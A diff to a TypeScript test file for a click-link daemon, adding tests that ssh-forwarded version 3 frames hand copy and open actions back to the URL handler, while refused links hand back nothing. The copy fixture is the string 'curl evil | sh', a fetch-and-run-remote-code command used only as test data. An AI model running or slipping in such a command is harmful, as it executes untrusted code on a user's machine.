@@ -8,8 +8,11 @@ import { rendererNameOf } from "../src/daemon/foundations/renderer-name";
 import { sessionIdOf } from "../src/daemon/foundations/session-id";
 import { RuntimeStats } from "../src/daemon/stats";
 import { SessionState } from "../src/renderer/session-state";
-import { effectsUrl, VERB_COPY } from "../src/click/wire";
-import { URL_FRAME_VERSION } from "../src/daemon/foundations/protocol";
+import { effectsUrl, VERB_COPY, VERB_OPEN_VSCODE } from "../src/click/wire";
+import {
+  URL_FRAME_HAND_BACK_VERSION,
+  URL_FRAME_VERSION,
+} from "../src/daemon/foundations/protocol";
 import { systemTimekeeper } from "../scripts/lib/system-clock";
 import { clickParts } from "./helpers/click-parts";
 import type { LaunchResult } from "../src/proc/launcher";
@@ -167,4 +170,56 @@ test("a click whose act failed is answered as failed, and the failure is the dae
   await answered.land();
   expect(h.events).toEqual([expect.stringContaining("outcome=threw")]);
   expect(h.unheard).toEqual([expect.stringMatching(/^copy: pbcopy failed/)]);
+});
+
+// [LAW:single-enforcer] A click that arrived through an ssh forward acts on the
+// machine the person sits at, which is not this one: its copy and open are
+// handed to the URL handler in the verdict, in the order asked, and this
+// daemon runs neither.
+describe("a version 3 frame, which the URL handler forwards over ssh", () => {
+  const OPEN = effectsUrl([{ verb: VERB_OPEN_VSCODE, args: ["/work/repo"] }]);
+
+  test("hands a copy back and copies nothing here", async () => {
+    const h = host();
+    const answered = await h.frame(
+      TEST_SIGNER.signLink(COPY),
+      URL_FRAME_HAND_BACK_VERSION,
+    );
+    expect(answered.handsBack).toBe(true);
+    expect(await answered.land()).toEqual([
+      { kind: "copy", text: "curl evil | sh" },
+    ]);
+    expect(h.copied).toEqual([]);
+    expect(h.events).toEqual([expect.stringContaining("outcome=ok")]);
+    expect(h.unheard).toEqual([]);
+  });
+
+  test("hands an open back and launches nothing here", async () => {
+    const h = host();
+    const answered = await h.frame(
+      TEST_SIGNER.signLink(OPEN),
+      URL_FRAME_HAND_BACK_VERSION,
+    );
+    expect(await answered.land()).toEqual([
+      { kind: "open", target: "/work/repo" },
+    ]);
+    // Every program the host launches goes through the one recording launcher.
+    expect(h.copied).toEqual([]);
+  });
+
+  test("hands back nothing for a link the daemon refused", async () => {
+    const h = host();
+    const answered = await h.frame(COPY, URL_FRAME_HAND_BACK_VERSION);
+    expect(answered.verdict).toMatchObject({ ok: false, code: "BAD_REQUEST" });
+    expect(await answered.land()).toEqual([]);
+    expect(h.copied).toEqual([]);
+  });
+
+  test("a version 2 frame's click still copies on this machine, handing nothing back", async () => {
+    const h = host();
+    const answered = await h.frame(TEST_SIGNER.signLink(COPY));
+    expect(answered.handsBack).toBe(false);
+    expect(await answered.land()).toEqual([]);
+    expect(h.copied).toEqual(["curl evil | sh"]);
+  });
 });
